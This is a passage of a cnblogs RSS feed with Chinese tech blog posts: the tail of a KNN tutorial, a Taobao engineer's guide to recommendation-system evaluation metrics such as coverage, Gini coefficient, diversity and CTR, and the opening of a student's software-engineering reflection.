trainData = np.array([[5, 1], [4, 0], [1, 3], [0, 4&lt;span&gt;]])
labels &lt;/span&gt;= [&lt;span&gt;'&lt;/span&gt;&lt;span&gt;动作片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;动作片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;爱情片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;爱情片&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
testData &lt;/span&gt;= [3, 2&lt;span&gt;]
X &lt;/span&gt;= knn(trainData, testData, labels, 3&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(X)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行这段代码后输出的结果为：动作片 。和预测的一样。当然通过这个算法分类的正确率不可能为 100%，可以通过增加修改数据测试，如果有大量多维的数据就更好了。&lt;/p&gt;

</description>
<pubDate>Mon, 04 Mar 2019 15:41:00 +0000</pubDate>
<dc:creator>Max_Lyu</dc:creator>
<og:description>一、概述 KNN（K-最近邻）算法是相对比较简单的机器学习算法之一，它主要用于对事物进行分类。用比较官方的话来说就是：给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lyuzt/p/10471617.html</dc:identifier>
</item>
<item>
<title>推荐算法评测心得 - 胖喵~</title>
<link>http://www.cnblogs.com/by-dream/p/10450880.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/by-dream/p/10450880.html</guid>
<description>&lt;p&gt;   ◆&lt;strong&gt;版权声明：本文出自&lt;/strong&gt;胖喵~的博客，转载必须注明出处。&lt;/p&gt;
&lt;p&gt;    转载请注明出处：&lt;a id=&quot;Editor_Edit_hlEntryLink&quot; title=&quot;view: 推荐算法评测心得&quot; href=&quot;https://www.cnblogs.com/by-dream/p/10450880.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/by-dream/p/10450880.html&lt;/a&gt; &lt;em&gt;&lt;a href=&quot;http://www.cnblogs.com/by-dream/p/5195121.html&quot; target=&quot;_blank&quot;&gt;&lt;br/&gt;&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;


&lt;p&gt;在taobao做推荐算法的质量工作将近一年，这一年尝试了很多东西，踩了不少坑，也对推荐的评测工作稍微有了些自己的心得，现在分享出来，希望能和做这块工作的同学一起交流、探讨，也欢迎多拍砖，多提意见。&lt;/p&gt;

&lt;h3 id=&quot;3f981012&quot;&gt;推荐系统&lt;/h3&gt;
&lt;p&gt;&lt;span data-key=&quot;297&quot;&gt;目前推荐技术的应用已经非常较普及了，新闻、商品、问答、音乐，几乎都会用到推荐算法来为你呈现内容。下面是淘宝、知乎、微博三个app的推荐模型，可以看到推荐都在非常重要的位置。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;296&quot;&gt;&lt;span data-key=&quot;297&quot;&gt;&lt;span data-key=&quot;297&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304232544280-1048761353.png&quot; alt=&quot;&quot; width=&quot;590&quot; height=&quot;442&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;


&lt;p&gt;&lt;span data-key=&quot;297&quot;&gt;在介绍推荐算法评测之前，我先简单说下推荐系统，这里我以商品为例，&lt;/span&gt;简单描述下推流程，让大家更明白一些，一般推荐主要包含以下步骤：&lt;/p&gt;
&lt;h4 id=&quot;9702925b&quot;&gt;召回-&amp;gt;打分排序-&amp;gt;透出&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;召回&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;召回阶段通常的手段是协同过滤比较场景的i2i,u2i等这种x2x，也有使用embedding的方式通过向量之间的距离进行召回。以i2i为例，假如现在要针对我推荐一个商品，那么首先要找到我感兴趣的物品 ，这些数据是通过我的历史行为来进行获取，比如拿到我最近一段时间内的点击、加购、收藏、购买的物品，将这些商品做为trigger进行召回，协同算法的具体就不再这里叙述了，有兴趣可以看下链接，最终我们按照协同过滤算法算出商品之间的相似分值，然后按照一定数量进行截断，因为这里截断也是依靠分数来进行的，所以一般这一步也称粗排。这样召回截断就完成了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打分&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;召回完商品后，我们需要对这些商品进行再一次的精排，这里需要用模型来预估ctr，一般情况下LR、GBDT、FM用的比较多，这里深度网络相对用的少，主要为了考虑到性能，尤其是rt，因为绝大部分的精排都是需要实时预测的，所有对耗时有一定的要求。继续说下模型预测的步骤，首先针对召回的商品进行特征的补充，例如该商品的一级类目、叶子类目（一级类目代表比较，叶子类目代表最细分的类目）、被多少用户购买等，然后再加入人的特征，例如性别、年龄、收入、对类目的偏好等，然后将这些信息做为feature，用模型进行预测，然后根据模型预测的结果进行排序，输出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打分过程中的模型是需要提前训练和部署，训练集的来源就是用户的实时行为加上用户和商品的特征。feature的构成是用户的特征和商品的特征，label则是用户是否点击了该商品。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304145109663-2131498440.png&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;390&quot;/&gt; &lt;/p&gt;
&lt;h3 id=&quot;3f981012&quot;&gt;质量方案&lt;/h3&gt;
&lt;p&gt;接下来说下如何保证这块的质量。由于推荐系统最终对用户需要提供实时的服务化，因此免不了有工程端的技术需要一起配合。因此我这块主要分为两个维度来开展，一方面是工程端的质量保证，一方面是算法侧的质量保证。&lt;/p&gt;
&lt;p&gt;工程端质量&lt;/p&gt;
&lt;p&gt;这一块可以将算法当成一个黑盒子，只把他当成一个有结果返回的接口。针对这方面前人已经有了丰富的经验，我们可以做接口的单元测试和冒烟测试，另外就是压测，在预估的qps下看rt是否满足业务方的要求，load是否过大，超时和错误的比例是否符合一定的预期。这里就不细说了，重点说说第二部分。&lt;/p&gt;
&lt;p&gt;算法端质量&lt;/p&gt;
&lt;p&gt;这里我再进行细分一下，分为三部分介绍：算法数据、算法模型、算法效果；&lt;/p&gt;
&lt;p&gt;算法数据：&lt;/p&gt;
&lt;p&gt;大家都知道算法在做训练前数据的处理部分非常的重要，有兴趣可以看下特征工程相关的内容，数据的来源，特征的构造，数据抽取、加工整个的过程都有可能会出现错误，而且数据一般都是存储在分布式系统数据库里，因此需要借助类似hive这样的工具将sql转换成MapReduce的任务去进行离线的计算，离线任务的产出通常会耗费不少的时间，而对于一些日更新的模型通过对数据对产出时间有一定的要求。因此数据这块最主要的保证点为：数据本身的质量，和数据的产出时间。数据本身的质量一般可以通过数据大小的整体抖动，以及关键字段是否为空，主键是否重复，做法比较简单可以通过简单sql或者udf来完成，然后借助工程能力做到预警、检查、出报表等。&lt;/p&gt;
&lt;p&gt;算法模型：&lt;/p&gt;
&lt;p&gt;模型的本身在迭代过程中也是需要关注的，不过通常算法同学的训练优化也是参考这些指标，所以我们也可以把这几个指标做为模型本身好坏的评估。具体为：准确率、召回率、AUC。&lt;/p&gt;
&lt;p&gt;算法效果：&lt;/p&gt;
&lt;p&gt;那么这个算法推荐出的效果究竟好不好呢，这个是一个非常主观的事情，每个人的感受也不是一样的，但是我们仍然要衡量它的好坏，这里我参考业内学者的推荐书籍以及自己的一些摸索，总结出下面一些方法，供大家参考。&lt;/p&gt;
&lt;p&gt;人工评测：&lt;/p&gt;
&lt;p&gt;顾名思义，邀请一帮人来对你的推荐系统的结果进行评测。这里想法来自于我在做翻译评测时期的经验，首先这个成本比较高，另外就是参杂了人的主观性非常的高，翻译的好坏我们可以通过制定一些细致的规则来进行约束，但是推荐的好坏我们却不好制定详细的规则，另外就是推荐之前的用户行为如何模拟，如何让评测者进行感知，这些都是比较难的，并且和基准的对比也不是很好做，所以这里不是很推荐用这个方法，但是还是要提一下。&lt;/p&gt;
&lt;p&gt;指标评估：&lt;/p&gt;
&lt;p&gt;指标化推荐结果，也就是将推荐的结果用不同的指标来进行说明，通过这些指标，你可以更加的了解你的推荐系统，部分指标不一定越高越好，但是你需要让它保持在一定的范围内。说到具体的例子的时候，我会提一下。下面我们看下这些指标。&lt;/p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;覆盖率&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;42&quot; readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;46&quot;&gt;定义：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;45&quot; readability=&quot;7&quot;&gt;&lt;span data-key=&quot;46&quot;&gt;&lt;span data-key=&quot;46&quot;&gt;推荐系统能够推荐出来的“商品/类目”占“总商品/类目”集合的比例。假设系统的用户集合为U，推荐系统给每个用户推荐一个长度为N的物品列表R(u) ，总物品为N。那么：&lt;/span&gt;&lt;/span&gt;
&lt;p&gt;覆盖率 =  &lt;span&gt;&lt;strong&gt;$\frac{\Sigma R(u)}{N}$&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;53&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;55&quot;&gt;描述推荐结系统对物品长尾发掘能力；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;55&quot;&gt;举个例子，淘宝上商品千千万万，推荐系统能否保证让新的一些商品有足够的机会曝光出去呢？还是有些商品永远都无法得到推荐曝光的机会。这个指标反应的就是这个情况，显然物品的覆盖率是达不到100%的，但是我们可以看类目的覆盖率来进行衡量，假设全网所有的一级大类目一共2千个（和全网上亿的物品相比非常的少），那么推荐系统一天之内推荐出去的商品对应的一级类目，这个就是我们要衡量的标准。如果覆盖率达不到100%，那么肯定是有问题的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;基尼系数&lt;/span&gt;&lt;/h3&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;56&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;58&quot;&gt;覆盖率反应出的分布情况是比较有限的，我们只能知道哪些类目覆盖了，哪些没有覆盖，那类目之间究竟哪个类目占的多，哪个类目占的少呢？为了更细致地描述推荐系统发掘长尾的能力，我们需要统计推荐列表中不同类目出现次数的分布，引入基尼系数来评价。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;59&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;61&quot;&gt;基尼系数：按照类目的流行度（曝光次数）从大到小排序后进行统计后进行洛伦茨曲线的绘制。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;62&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;64&quot;&gt;做法：&lt;/span&gt;&lt;span data-key=&quot;67&quot;&gt;以类目分布基尼系数为例，算出所有的类目被曝光的次数，需要以天周期为单位进行数据的统计。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;68&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;69&quot;&gt;&lt;span data-key=&quot;70&quot;&gt;&lt;img class=&quot;image&quot; src=&quot;https://cdn.nlark.com/lark/0/2018/png/96011/1533808151065-dfd5e5c9-b682-4eb7-9364-f70cbdfdc476.png&quot; alt=&quot;&quot; width=&quot;449&quot; height=&quot;257&quot;/&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&lt;span data-key=&quot;70&quot;&gt;这里需要说明一下，基尼系数越大代表所有类目的分布越不均匀，系数越小代表类目分布越均匀。我们知道，每个电商网站都有其侧重的类目，因此绝对平均不是一件好事，头部的类目占比稍多一些但是不能太离谱，举个例子100个类目，前5个占比到30～40%是相对比较好的。当然绝对的只看这个数据意义也不是很大，更多的是长期对这个指标进行监控，看是否会发生大的变动。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;
&lt;h3 id=&quot;tyzydf&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;40&quot; data-id=&quot;tyzydf&quot;&gt;&lt;span data-key=&quot;41&quot;&gt;打散度&lt;/span&gt;&lt;/h3&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;定义：描述推荐结果中结果数据的分散程度。&lt;/p&gt;
&lt;div data-type=&quot;alignment&quot; data-value=&quot;center&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;打散度 = &lt;span&gt;$\frac{2}{k(k-1)} \sum\limits_{i\neq j}^{k} 0.85^{dis((i,j)-1) * sim(i,j)}  $&lt;/span&gt; (dis(i,j) = |i-j|,sim(i,j) 为 i==j?1!0)&lt;/p&gt;
&lt;/div&gt;
&lt;div data-type=&quot;indent&quot; data-value=&quot;0&quot; readability=&quot;14&quot;&gt;
&lt;p&gt;这里需要解释一下，这里首先是对两两物品（不同的位置）计算为打散度后，得出整体的打散度。相似函数sim代表两两是否相同，相同则为1，不相似则为0。关于两个内容之间距离对打散度的影响，不能是线性的关系，因为随着两个商品出现的位置越来越大，用户对重复商品的感受会逐渐的减弱（很近的位置就有两个相似的内容觉得会有些重复，但是如果比较远的位置有两个相似的一般是可以接受的），一般双列流屏幕出现内容大概是4个，0.85^(5-1) 大概在 0.5左右，所以如果是5以内，则打散度会很低，但是如果&amp;gt;5了，打散度就不会衰减的比较厉害了。 相似的两个物品越靠近，权重越大。&lt;/p&gt;
&lt;div data-type=&quot;p&quot; readability=&quot;17.5&quot;&gt;

&lt;p&gt;定义：描述推荐系统不断迭代过程中推荐结果变化程度的指标。&lt;/p&gt;
&lt;p&gt;更新率 = 1 - &lt;span&gt;$\frac{S_{昨日}  ∩  S_{昨日}}{S_{昨日}  ∪  S_{昨日}}$&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;上面公式还是以类目为例，$S_{昨日}$代表昨天一天出现的所有商品所在的类目的个数，然后两天的交集除以并集，计算得出推荐出商品所属类目的更新率。&lt;/p&gt;
&lt;h3 id=&quot;4ew7ct&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;2&quot; data-id=&quot;4ew7ct&quot;&gt;&lt;span data-key=&quot;3&quot;&gt;发现性&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;4&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;6&quot;&gt;定义：推荐系统对用户未产生过关系的商品的发现能力。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;7&quot; readability=&quot;14.5&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;在全网商品中，可能有一些比较好的商品，但是用户从来都没有点击过类似的物品，这时候推荐系统推荐给用户的时候，用户很有可能会眼前一亮，满满惊喜。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;&lt;span data-key=&quot;9&quot;&gt;发现性 = &lt;span&gt;$\frac{1}{n} \sum\limits_{i=1}^{n}  \frac{ S_{今日点击（前一周未点击）}  }{  S_{前一周点击}}$&lt;/span&gt;  &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;8&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;9&quot;&gt;同样以类目为例，今天我点击了一个我感兴趣的商品，而这个商品的类似恰恰是我前一周都没有点击过过的内容，这就说明推荐系统的为我推荐了一个我之前都没有关注过并且我感兴趣的内容，也就是系统的发现性，在算出每个人的值之后，再进行求平均计算。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;193&quot; readability=&quot;17.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;上新率&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;定义： 新内容被推荐系统推荐的曝光情况，这里可以从两个维度产出这项指标。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;上新率1 = &lt;span&gt;$\frac{当日曝光的内容中内容为最近一周生产的内容数}{当日曝光内容数} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-alignment bi-alignment-center&quot; data-key=&quot;174&quot;&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;175&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;上新率2 = &lt;span&gt;$\frac{当日曝光的内容中内容为最近一周生产的内容数}{最近一周生产的内容数} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;意义：对于一些社区类产品UGC内容的推荐，用户生产的优质是整个社区最重要的一部分，及时的曝光用户的新内容对于增加用户留存和给社区增添活力都有很大的帮助，因此需要这两个指标来评估推荐算法对于新内容的推荐能力。&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;失效率&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;168&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;173&quot;&gt;定义： 表示系统没有推荐或推荐后未被用户点击数据占全集的比例。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-alignment bi-alignment-center&quot; data-key=&quot;174&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;176&quot;&gt;失效率 = &lt;span&gt;$\frac{S(0)}{S} $&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;177&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;179&quot;&gt;S(0) 表示实际点击次数为 0 的数据个数；S表示推荐集合的总数。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;180&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;182&quot;&gt;首先需要定义一个时间范围来计算没有被推荐出的。其含义为最终未被用户真正感知的数据的占比，未感知包含未推荐和推荐出去后未被点击的内容。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;183&quot; readability=&quot;10.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;&lt;span data-key=&quot;153&quot;&gt;健壮性&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;定义：算法健壮性的评测主要利用模拟攻击。首先，给定一个数据集和一个算法，可以用这个算法给这个数据集中的用户生成推荐列表。然后，用常用的攻击方法向数据集中注入噪声数据，然后利用算法在注入噪声后的数据集上再次给用户生成推荐列表。最后，通过比较攻击前后推荐列表的相似度评测算法的健壮性。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;161&quot; readability=&quot;11&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;163&quot;&gt;总结：适合在离线环境进行完成，针对模型本身的评测。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;除了上面介绍的通过这些指标的方法来进行评估，当推荐真正运用在业务上，通过业务侧的一些数据反馈也可以知道推荐算法的好坏。具体看下面两项：&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;&lt;span data-key=&quot;153&quot;&gt;负反馈&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;定义：负反馈相当于一个轻量级便携的用户反馈，用户可以直接对推荐出的内容给与反馈，推荐系统在拿到了用户实时反馈后就会立刻针对反馈信息对推荐结果做出相应的调整，而我们也可以在事后拿到负反馈的整体数据来评价推荐系统在用户侧是否有重大舆情产生&lt;/span&gt;。一般app的推荐都会有负反馈机制，如图：&lt;/p&gt;
&lt;div class=&quot;bi-unstyle bi-dnd&quot; data-key=&quot;159&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/626346/201903/626346-20190304232829274-443490501.png&quot; alt=&quot;&quot; width=&quot;484&quot; height=&quot;363&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;161&quot; readability=&quot;7.5&quot;&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;ctr&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;Click-Througt-Rate，即点击率，点击数/曝光数。推荐算法效果的最最重要指标，没有之一。一般算法好不好，都会直接用这个指标直接定义。通常算法模型在迭代的过程中都会进行ab test，所谓ab test就是有一个基准桶，一个对比桶，通过收集两个不同方案在用户侧的点击率，来评估算法的好坏，一般来说当流量特别大的时候，基本上一个ab实验上线几分钟就可以出算法的好坏了。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&quot;icp3cp&quot; class=&quot;bi-heading bi-heading-three bi-dnd&quot; data-key=&quot;152&quot; data-id=&quot;icp3cp&quot;&gt;ctr&lt;/h3&gt;
&lt;div class=&quot;bi-indent bi-indent-0&quot; data-key=&quot;158&quot; readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;span data-key=&quot;160&quot;&gt;Conversation Rate，即转化率，转化数/点击数。通常在广告上用的比较多，对于商品来说也就是用户最终点击并且购买的转化率。因为最终决定转化的因素还是比较多的，不单单是推荐算法影响的，所以这个指标通常不做为模型迭代优化的衡量标准，但是由于其和最终的&quot;钱&quot;挂钩，所以一般领导会更加关注这个指标。&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;总结：&lt;/p&gt;
&lt;p&gt;~&lt;/p&gt;


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</description>
<pubDate>Mon, 04 Mar 2019 15:31:00 +0000</pubDate>
<dc:creator>胖喵~</dc:creator>
<og:description>◆版权声明：本文出自胖喵~的博客，转载必须注明出处。 转载请注明出处：https://www.cnblogs.com/by-dream/p/10450880.html 在taobao做推荐算法的质量工</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/by-dream/p/10450880.html</dc:identifier>
</item>
<item>
<title>【软工作业&amp;思考】关于软工的一些概念性理解暨第一次阅读作业 - HansBug</title>
<link>http://www.cnblogs.com/HansBug/p/10473959.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/HansBug/p/10473959.html</guid>
<description>&lt;h2 id=&quot;概述&quot;&gt;概述&lt;/h2&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;4.4895833333333&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;0.90909090909091&quot;&gt;&lt;td&gt;本次作业所属课程&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://edu.cnblogs.com/campus/buaa/BUAA_SE_2019_RJ&quot;&gt;2019BUAA软件工程 周二班&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2.5957446808511&quot;&gt;&lt;td&gt;本次作业要求&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://edu.cnblogs.com/campus/buaa/BUAA_SE_2019_RJ/homework/2626&quot;&gt;第1次个人作业&lt;/a&gt;&lt;br/&gt;当然，比这个更重要百倍的还是实实在在的思考，这也是标题如此命名的原因&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;我在本课程的目标&lt;/td&gt;
&lt;td&gt;在原有实践经验的基础上，系统化学习软工领域的理论知识，总结以前以及现在的得与失，提高自身知识水平（&lt;del&gt;怎么一股生命在流逝的味道&lt;/del&gt;）&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;本次作业的帮助&lt;/td&gt;
&lt;td&gt;将《构建之法》与实际经验进行结合&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;好吧，既然是概述，那么就先说点什么，光一个表格个人感觉表现力太有限了。&lt;strong&gt;如果对笔者的自报家门没啥兴趣的话，可以直接跳到下一节&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;首先，本人很早就有计算机方面的技术背景（早到什么程度呢，我学编程那会，Google在大陆还能直接上，QQ号还都是8位的），在编程方面，私以为还算是略知一二，或者说有那么一点点的经验。&lt;/p&gt;
&lt;p&gt;其次，本人在大一开始就进行过实用系统的开发，其中包括：&lt;/p&gt;
&lt;p&gt;嘛。。。先打住，再这样下去实在有点像是产品软文了。[捂脸]&lt;/p&gt;
&lt;p&gt;此外，笔者带过不止一个技术开发团队，作为团队的leader。踩过坑，也从屎山里面爬出来过；胜利过，也失败过；团队里大家一块嗨过，也层不止一度出现严重分歧，甚至分崩离析过。其中，私以为还算是有一点点略微的心得。&lt;/p&gt;
&lt;p&gt;说这些的目的呢，其实特别简单。笔者从没认为自己如何如何，只是阐述一下客观事实，做一些微小的工作，或者说，铺垫。以防止下面看到有些内容的时候，被认为是在分享刚编的故事。&lt;/p&gt;
&lt;p&gt;好了打住，先说到这。下面是正文。&lt;/p&gt;
&lt;h2 id=&quot;个人的思考&quot;&gt;个人的思考&lt;/h2&gt;
&lt;p&gt;其实说来，本人的疑惑和思考可能和大部分同学有些不一样。所以我就尽量按照我的方式来表达，并且可以的话也说一些我对其他同学疑惑的理解吧。&lt;/p&gt;
&lt;h3 id=&quot;思考一pm做开发和测试之外的所有事情&quot;&gt;思考一：PM做开发和测试之外的所有事情&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;PM做开发和测试之外的所有事情&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这话确实很有道理，说的也没错。（&lt;del&gt;或者倒不如说，非技术背景出身的PM也没办法插手这事&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;然而，&lt;strong&gt;要是，PM也是技术背景出身，甚至还是有一定经验的技术人员呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;笔者自己就遇到过类似的情况。&lt;/p&gt;
&lt;p&gt;在笔者之前早期带的团队里面，就是会出现有的时候全体进展缓慢的情况。这个其实也正常，都是身边的同学，不是谁都有写过十几年的代码的。&lt;/p&gt;
&lt;p&gt;于是，尤其是ddl迫近的时候，笔者我当时遇到这样的情况，常常自己就看不下去了。一拍腿，老子自己上。&lt;/p&gt;
&lt;p&gt;果不其然，自己一上阵，问题最终就很快被解决了。&lt;/p&gt;
&lt;p&gt;如果只从结果的角度来看，这当然是皆大欢喜——这世上从来就没有过啥好手段坏手段，能解决问题的就是最好的。&lt;/p&gt;
&lt;p&gt;对于临时的小队伍来说，这还算好，最起码结果是好的。&lt;strong&gt;然而之后发生的事情证明，这种做法对于长期的团队来说，这是一件非常危险的事&lt;/strong&gt;。&lt;/p&gt;
